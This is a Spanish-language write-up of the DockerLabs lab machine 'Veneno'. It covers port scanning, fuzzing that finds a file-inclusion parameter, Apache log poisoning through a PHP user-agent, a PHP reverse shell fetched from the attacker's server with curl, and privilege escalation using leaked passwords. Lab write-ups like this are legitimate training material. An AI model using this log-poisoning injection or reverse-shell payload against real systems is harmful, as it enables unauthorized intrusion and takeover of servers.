# Veneno DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip veneno.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh veneno.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-15 15:53 EST
Nmap scan report for cinema.dl (172.17.0.2)
Host is up (0.000034s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89:9c:7b:99:95:b6:e8:03:5a:6a:d4:69:69:4a:8d:35 (ECDSA)
|_  256 ec:ec:90:44:4e:66:64:22:f6:8b:cd:29:d2:b5:60:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.69 seconds
```

Si entramos en el puerto `80` veremos que es un `apache2` normal, por lo que haremos un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.html       (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10671]
/problems.php         (Status: 200) [Size: 10671]
/server-status        (Status: 403) [Size: 275]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos un sitio interesante llamado `/problems.php` vamos a ver que hay dentro.

```
URL = http://<IP>/problems.php
```

Vemos que es donde esta subido el `apache2` normal, por lo que vamos a ver si tuviera algun parametro vulnerable.

## FFUF

```shell
ffuf -u http://<IP>/problems.php?FUZZ=/etc/passwd -w <WORDLIST> -fs 10671
```

Info:

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/problems.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 10671
________________________________________________

backdoor                [Status: 200, Size: 1245, Words: 8, Lines: 26, Duration: 2ms]
:: Progress: [20469/20469] :: Job [1/1] :: 2531 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

Vemos que hay uno llamado `backdoor` por lo que haremos lo siguiente:

## Escalate user www-data

```
URL = http://<IP>/problems.php?backdoor=/etc/passwd
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
carlos:x:1001:1001:,,,:/home/carlos:/bin/bash
```

Vemos que hay un usuario llamado `carlos`, pero si probamos a tirar fuerza bruta no sacaremos nada, por lo que vamos a ver si es vulnerable a un `LOG POISONING`.

```
URL = http://<IP>/problems.php?backdoor=/var/log/apache2/error.log
```

Vemos que las ultimas entradas son algo asi:

```
172.17.0.1 - - [16/Jan/2025:07:01:37 +1000] "GET /problems.php?backdoor=../../../var/www/apache2/error.log HTTP/1.1" 200 203 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
172.17.0.1 - - [16/Jan/2025:07:02:16 +1000] "GET /problems.php?backdoor=/var/log/apache2/error.log HTTP/1.1" 200 485069 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
172.17.0.1 - - [16/Jan/2025:07:02:33 +1000] "GET /problems.php?backdoor=/var/log/apache2/access.log HTTP/1.1" 200 487286 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
```

Por lo que vamos a probar a enviar un comando a ver si lo ejecuta:

```shell
curl -A "<?php system('id'); ?>" http://<IP>/problems.php
```

Si recargamos el `error.log` vemos que la ultima entrada es:

```
172.17.0.1 - - [16/Jan/2025:07:05:12 +1000] "GET /problems.php HTTP/1.1" 200 10863 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Por lo que se puede injectar comando, vamos hacernos una `reverse shell` aprovechando esto de la siguiente forma, nos vamos a descargar un archivo con una shell nuestra al directorio `uploads/` que descubrimos anteriormente:

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Una vez creado el archivo, tendremos que subirlo a la maquina y pasarlo a la carpeta `uploads/`:

```shell
python3 -m http.server
```

```shell
curl -A "<?php exec('curl http://<IP_ATTACKER>:8000/shell.php -o /var/www/html/uploads/shell.php'); ?>" http://<IP>/problems.php
```

Si recargamos el `error.log` vemos que en el servidor de `python3` tendremos la siguiente salida:

```
172.17.0.2 - - [15/Jan/2025 16:14:54] "GET /shell.php HTTP/1.1" 200 -
```

Y si nos vamos a la carpeta `uploads/` veremos que esta el archivo `shell.php` por lo que nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Y nos vamos a la siguiente direccion:

```
URL = http://<IP>/uploads/shell.php
```

Si nos vamos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.2] 59298
whoami
www-data
```

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user carlos

Si listamos los archivos que hay en la siguiente direccion del sistema:

```shell
ls -la /var/www/html/
```

Info:

```
total 40
drwxr-xr-x 1 root root  4096 Jun 29  2024 .
drwxr-xr-x 1 root root  4096 Jun 29  2024 ..
-rw-r--r-- 1 root root   163 Jun 29  2024 antiguo_y_fuerte.txt
-rw-r--r-- 1 root root 10671 Jun 29  2024 index.html
-rw-r--r-- 1 root root   157 Jun 29  2024 problems.php
drwxrwxrwx 1 root root  4096 Jan 16 07:14 uploads
```

Vemos que hay uno interesante llamado `antiguo_y_fuerte.txt` que si lo leemos veremos lo siguiente:

```
Es imposible que me acuerde de la pass es inhackeable pero se que la tenpo en el mismo fichero desde fa 24 anys. trobala buscala 

soy el unico user del sistema.
```

Vamos a buscar si hubiera algo con esa palabra:

```shell
find / -name "inhackeable*" 2>/dev/null
```

Info:

```
/usr/share/viejuno/inhackeable_pass.txt
```

Vemos que en la siguiente direccion hay un archivo que dice lo siguiente:

```
pinguinochocolatero
```

Por lo que podremos suponer que es la contraseña de `carlos`:

```shell
su carlos
```

Metemos como contraseña `pinguinochocolatero` y veremos que somos dicho usuario.

## Escalate Privileges

Si vamos a la `home` de `carlos` vemos muchisimas carpetas, pero podremos filtrarlo por `bytes` de cuales tienen contenido y cuales no, para que nos muestre cuales no estan vacias:

```shell
du -sb * | awk '$1 != 4096 && $1 > 0 {print $2}'
```

Info:

```
carpeta55
```

Y vemos que esa carpeta no esta vacia, contiene lo siguiente:

```
-rw-r--r-- 1 root   root   627985 Jun 29  2024 .toor.jpg
```

Por lo que vemos es una imagen, por lo que vamos a pasarnosla a nuestro `host` para extraer metadatos a ver que vemos.

```shell
python3 -m http.server
```

Y desde el `host` haremos...

```shell
wget http://<IP>:8000/.toor.jpg
```

Info:

```
--2025-01-15 16:30:22--  http://172.17.0.2:8000/.toor.jpg
Connecting to 172.17.0.2:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 627985 (613K) [image/jpeg]
Saving to: ‘.toor.jpg’

.toor.jpg                               100%[============================================================================>] 613.27K  --.-KB/s    in 0.001s  

2025-01-15 16:30:22 (986 MB/s) - ‘.toor.jpg’ saved [627985/627985]
```

Ahora vamos a extraer los metadatos:

```shell
exiftool .toor.jpg
```

Info:

```
ExifTool Version Number         : 13.00
File Name                       : .toor.jpg
Directory                       : .
File Size                       : 628 kB
File Modification Date/Time     : 2024:06:28 20:19:05-04:00
File Access Date/Time           : 2025:01:15 16:30:22-05:00
File Inode Change Date/Time     : 2025:01:15 16:30:22-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Quality                   : pingui1730
Image Width                     : 2048
Image Height                    : 2048
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2048x2048
Megapixels                      : 4.2
```

Vemos que en la parte de `Image Quality` vemos una palabra bastante interesante llamada `pingui1730` por lo que podremos deducir que puede ser la contraseña de `root`.

```shell
su root
```

Metemos como contraseña `pingui1730` y veremos que somos `root`, por lo que habremos terminado la maquina.
